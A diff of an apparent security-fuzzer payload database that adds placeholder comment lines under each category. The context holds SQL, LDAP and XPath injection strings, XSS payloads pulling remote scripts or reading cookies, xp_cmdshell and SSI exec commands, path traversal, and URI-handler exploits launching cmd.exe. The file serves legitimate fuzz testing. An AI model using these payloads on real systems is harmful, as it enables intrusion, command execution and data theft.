@@ -8,6 +8,7 @@
 
 P:001-HTT-PMT:HTTP Methods:15
 > HTTP Methods | Replacive Fuzzers 
+>>This is a comment line to be changed in the future
 get
 post
 head
@@ -26,6 +27,7 @@ search
 
 P:002-INT-OVF:Integer Overflows:12
 > Exploits | Replacive Fuzzers | Integer Overflows
+>>This is a comment line to be changed in the future
 -1
 0
 0x100
@@ -41,6 +43,7 @@ P:002-INT-OVF:Integer Overflows:12
 
 P:003-FSE-STR:Format String Payloads:19
 > Exploits | Replacive Fuzzers | Format String Errors 
+>>This is a comment line to be changed in the future
 %s%p%x%d
 .1024d
 %.2049d
@@ -62,6 +65,7 @@ f(x)=%x x 257
 
 P:004-SQL-INJ:SQL Injection:16
 > Replacive Fuzzers | SQL Injection | Injection
+>>This is a comment line to be changed in the future
 a
 a' 
 a' --
@@ -81,6 +85,7 @@ x' or full_name like '%bob%
 
 P:005-SQL-INJ:MySQL Injection 101:4
 > Replacive Fuzzers | SQL injection | Injection
+>>This is a comment line to be changed in the future
 a
 1 or 1=1
 1' or '1'='1
@@ -88,6 +93,7 @@ a
 
 P:006-SQL-INJ:MySQL Injection (Blind):5
 > Replacive Fuzzers | SQL Injection | Injection
+>>This is a comment line to be changed in the future
 1
 1'1
 1 exec sp_ (or exec xp_)
@@ -96,6 +102,7 @@ P:006-SQL-INJ:MySQL Injection (Blind):5
 
 P:007-SQL-INJ:MySQL/MS SQL Common Injection:9
 > Replacive Fuzzers | SQL Injection | Injection
+>>This is a comment line to be changed in the future
 1
 1 and user_name() = 'dbo'
 \'; desc users; --
@@ -108,11 +115,13 @@ P:007-SQL-INJ:MySQL/MS SQL Common Injection:9
 
 P:008-SQL-INJ:Oracle SQL Injection:2
 > Replacive Fuzzers | SQL Injection | Injection
+>>This is a comment line to be changed in the future
 '||utl_http.request('httP://192.168.1.1/')||'
 ' || myappadmin.adduser('admin', 'newpass') || '
 
 P:009-SQL-INJ:Passive SQL Injection:55
 > Replacive Fuzzers | SQL Injection | Injection
+>>This is a comment line to be changed in the future
 '||(elt(-3+5,bin(15),ord(10),hex(char(45))))
 ||6
 '||'6
@@ -171,6 +180,7 @@ uni/**/on sel/**/ect
 
 P:010-SQL-INJ:Active SQL Injection:9
 > Replacive Fuzzers | SQL Injection| Injection
+>>This is a comment line to be changed in the future
 '; exec master..xp_cmdshell 'ping 10.10.1.2'--
 create user name identified by 'pass123'
 create user name identified by pass123 temporary tablespace temp default tablespace users; 
@@ -183,6 +193,7 @@ insert into users(login, password, level) values( char(0x70) + char(0x65) + char
 
 P:011-SQL-INJ:MS SQL Injection i:8
 > SQL Injection | Injection | Replacive Fuzzers
+>>This is a comment line to be changed in the future
 a
 ' or 1=1 --
 ' union (select @@version) --
@@ -194,6 +205,7 @@ a
 
 P:012-SQL-INJ:MS SQL Ninja Injection (Blind):9
 > SQL Injection | Injection | Replacive Fuzzers
+>>This is a comment line to be changed in the future
 a
 '; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --
 '; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --
@@ -206,6 +218,7 @@ a
 
 P:013-LDP-INJ:LDAP Injection:14
 > Replacive Fuzzers | LDAP Injection | Injection
+>>This is a comment line to be changed in the future
 |
 !
 (
@@ -223,6 +236,7 @@ admin*)((|userpassword=*)
 
 P:014-XPT-INJ:XPath Injection:10
 > Replacive Fuzzers | XPath Injection | Injection
+>>This is a comment line to be changed in the future
 ' or '1'='1
 ' or ''='
 x' or 1=1 or 'x'='y
@@ -236,6 +250,7 @@ x' or name()='username' or 'x'='y
 
 P:015-XSS-101:XSS 101:9
 > XSS | Replacive Fuzzers
+>>This is a comment line to be changed in the future
 <script>alert('xss')</script>
 <script>alert(string.fromcharcode(88,83,83))</script>
 </title><script>alert(1)</script>
@@ -248,6 +263,7 @@ P:015-XSS-101:XSS 101:9
 
 P:016-XSS-102:XSS 102:10
 > XSS | Replacive Fuzzers
+>>This is a comment line to be changed in the future
 '';!--"<XSS>=&{()}
 */a=eval;b=alert;a(b(/e/.source));/*
 '%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'
@@ -261,6 +277,7 @@ perl -e 'print "<SCR\0IPT>alert("XSS")</SCR\0IPT>";' > out
 
 P:017-XSS-JSB:XSS JS Breaks:11
 > XSS | Replacive Fuzzers
+>>This is a comment line to be changed in the future
 alert(1)
 A=alert;A(1)
 +alert(0)+
@@ -275,6 +292,7 @@ xyz onerror=alert(6);
 
 P:018-XSS-4IE:XSS Internet Explorer:38
 > XSS | Replacive Fuzzers
+>>This is a comment line to be changed in the future
 <img src=`x` onrerror= ` ;; alert(1) ` />
 </a style=""xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')">
 style=color: expression(alert(0));" a="
@@ -316,6 +334,7 @@ res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210
 
 P:019-XSS-GEK:XSS Gecko:11
 > XSS | Replacive Fuzzers
+>>This is a comment line to be changed in the future
 (1?(1?{a:1?""[1?"ev\a\l":0](1?"\a\lert":0):0}:0).a:0)[1?"\c\a\l\l":0](content,1?"x\s\s":0)
 <STYLE TYPE="text/javascript">alert('XSS');</STYLE>
 <SCRIPT SRC=http://ha.ckers.org/xss.js
@@ -330,6 +349,7 @@ style=-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="
 
 P:020-XSS-INJ:XSS Style Injection:14
 > XSS | Replacive Fuzzers
+>>This is a comment line to be changed in the future
 style=color: expression(alert(0));" a="
 style=-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="
 width: expression((window.r==document.cookie)?'':alert(r=document.cookie))
@@ -347,6 +367,7 @@ sstyle=foobar"tstyle="foobar"ystyle="foobar"lstyle="foobar"estyle="foobar"=-moz-
 
 P:021-XSS-HTM:XSS HTML Breaking:7
 > XSS | Replacive Fuzzers
+>>This is a comment line to be changed in the future
 <s>000<s>%3cs%3e111%3c/s%3e%3c%73%3e%32%32%32%3c%2f%73%3e&#60&#115&#62&#51&#51&#51&#60&#47&#115&#62&#x3c&#x73&#x3e&#x34&#x34&#x34&#x3c&#x2f&#x73&#x3e
 ';alert(0)//\';alert(1)//";alert(2)//\";alert(3)//--></SCRIPT>">'><SCRIPT>alert(4)</SCRIPT>=&{}");}alert(6);function xss(){//
 ';alert(0)//\';alert(1)//";alert(2)//\";alert(3)//--></SCRIPT>">'></title><SCRIPT>alert(4)</SCRIPT>=&{</title><script>alert(5)</script>}");}
@@ -357,6 +378,7 @@ P:021-XSS-HTM:XSS HTML Breaking:7
 
 P:022-XSS-EMB:XSS Embed/Evade:10
 > XSS | Replacive Fuzzers
+>>This is a comment line to be changed in the future
 <EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
 <SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 <SCRIPT ="blah" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
@@ -370,6 +392,7 @@ P:022-XSS-EMB:XSS Embed/Evade:10
 
 P:023-XSS-IMG:XSS Image Tag:10
 > XSS | Replacive Fuzzers
+>>This is a comment line to be changed in the future
 <IMG SRC=javascript:alert('XSS')>
 <IMG SRC=JaVaScRiPt:alert('XSS')>
 <IMG SRC=`javascript:alert("XSS says, 'XSS'")`>
@@ -383,6 +406,7 @@ P:023-XSS-IMG:XSS Image Tag:10
 
 P:024-XSS-NET:ASP .NET validateRequest:5
 > XSS | Replacive Fuzzers
+>>This is a comment line to be changed in the future
 </XSS STYLE=xss:expression(alert('XSS'))>
 XSS STYLE=xss:e/**/xpression(alert('XSS'))>
 XSS-STYLE=xss:e/**/xpression(alert('XSS'))>
@@ -391,6 +415,7 @@ XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
 
 P:025-XSS-XML:XSS XML Injection:6
 > XSS | XML Injection | Replacive Fuzzers | Injection
+>>This is a comment line to be changed in the future
 <xml id=i><x><c><![cdata[<img src="javas]]><![cdata[cript:alert('xss');">]]></c></x></xml><span datasrc=#i datafld=c dataformatas=html>
 <xml id="xss"><i><b><img src="javas<!-- -->cript:alert('xss')"></b></i></xml><span datasrc="#xss" datafld="b" dataformatas="html"></span>
 <html><body><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributename="innerhtml" to="xss<script defer>alert('xss')</script>"> </body></html>
@@ -400,6 +425,7 @@ P:025-XSS-XML:XSS XML Injection:6
 
 P:026-XSS-URI:URI Cross Site Scripting:4
 > XSS | URI Exploits | Replacive Fuzzers
+>>This is a comment line to be changed in the future
 aim: &c:\windows\system32\calc.exe" ini="C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat"
 firefoxurl:test|"%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');"
 navigatorurl:test" -chrome "javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)
@@ -408,6 +434,7 @@ res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210
 
 P:027-XSS-JSN:JSON:5
 > XSS | Replacive Fuzzers
+>>This is a comment line to be changed in the future
 <body onload=;a2={y:eval};a1={x:a2.y('al'+'ert')};;;;;;;;;_=a1.x;_(1);;;;
 <body onload=a1={x:this.parent.document};a1.x.writeln(1);>
 <body onload=;a1={x:document};;;;;;;;;_=a1.x;_.write(1);;;;
@@ -416,22 +443,26 @@ P:027-XSS-JSN:JSON:5
 
 P:028-XSS-SSI:Server Side Includes:2
 > XSS | Replacive Fuzzers | Web Server
+>>This is a comment line to be changed in the future
 <!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"-->
 <!--#exec cmd=""/usr/X11R6/bin/xterm ?display 127.0.0.1:0 &""-->
 
 P:029-PTH-SMF:Sample Files:2
 > Web Server | Replacive Fuzzers
+>>This is a comment line to be changed in the future
 /../.. /../../../boot.ini
 /../../../../../winnt/repair/setup.log
 
 P:030-XSS-BRK:URL Breaking:3
 > XSS | Replacive Fuzzers
+>>This is a comment line to be changed in the future
 httP://aa"><script>alert(123)</script>
 httP://aa'><script>alert(123)</script>
 httP://aa<script>alert(123)</script>
 
 R:031-B16-HEX:Base16 (HEX):16
 > Number Systems | Base | Recursive Fuzzers
+>>This is a comment line to be changed in the future
 0
 1
 2
@@ -451,6 +482,7 @@ f
 
 R:032-B10-DEC:Base10 (DEC):10
 > Number Systems | Base | Recursive Fuzzers
+>>This is a comment line to be changed in the future
 0
 1
 2
@@ -464,6 +496,7 @@ R:032-B10-DEC:Base10 (DEC):10
 
 R:033-B08-OCT:Base08 (OCTAL):8
 > Number Systems | Base | Recursive Fuzzers
+>>This is a comment line to be changed in the future
 0
 1
 2
@@ -475,11 +508,13 @@ R:033-B08-OCT:Base08 (OCTAL):8
 
 R:034-B02-BIN:Base02 (binary):2
 > Number Systems | Base | Recursive Fuzzers
+>>This is a comment line to be changed in the future
 0
 1
 
 R:035-B36-ALP:Alpha Numeric:36
 > Alphabets | Recursive Fuzzers 
+>>This is a comment line to be changed in the future
 a
 b
 c
@@ -519,6 +554,7 @@ z
 
 R:036-ALP-HAB:English Alphabet:26
 > Alphabets | Recursive Fuzzers
+>>This is a comment line to be changed in the future
 a
 b
 c
@@ -548,6 +584,7 @@ z
 
 R:037-B64-RFC:Base64 Alphabet:64
 > Alphabets | Number Systems | Base | Recursive Fuzzers
+>>This is a comment line to be changed in the future
 A
 B
 C
@@ -616,6 +653,7 @@ z
 
 R:038-B64-URL:Base64 (URL/File Safe) Alphabet:64
 > Alphabets | Number Systems | Base | Recursive Fuzzers
+>>This is a comment line to be changed in the future
 A
 B
 C
@@ -684,6 +722,7 @@ _
 
 R:039-B32-RFC:Base32 Alphabet:32
 > Alphabets | Number Systems | Base | Recursive Fuzzers
+>>This is a comment line to be changed in the future
 A
 B
 C
@@ -720,6 +759,7 @@ Z
 
 R:040-B32-HEX:Base32 (Extended HEX) Alphabet:32
 > Alphabets | Number Systems | Base | Recursive Fuzzers | uppercase fuzzers
+>>This is a comment line to be changed in the future
 0
 1
 2
@@ -756,6 +796,7 @@ V
 
 P:041-BFO-EXP:Long Strings of aaa's:17
 > Exploits | Buffer Overflows
+>>This is a comment line to be changed in the future
 a
 f(x)=a x 3
 f(x)=a x 5
@@ -776,6 +817,7 @@ f(x)=a x 65537
 
 R:042-DNA-ALP:DNA Fuzzer:4
 > Biology | Alphabets
+>>This is a comment line to be changed in the future
 a
 t
 c
@@ -783,6 +825,7 @@ g
 
 P:043-XSS-AXL:MS Anti-XSS lib_v3.0:78
 > XSS | Replacive Fuzzers
+>>This is a comment line to be changed in the future
 &#60;SCRIPT&#62;alert&#40;&#39;XSS&#39;&#41;&#60;&#47;SCRIPT&#62;
 &#60;SCRIPT SRC&#61;http&#58;&#47;&#47;testsite.com&#47;xss.js&#62;&#60;&#47;SCRIPT&#62;
 &#60;SCRIPT&#62;alert&#40;String.fromCharCode&#40;88,83,83&#41;&#41;&#60;&#47;SCRIPT&#62;
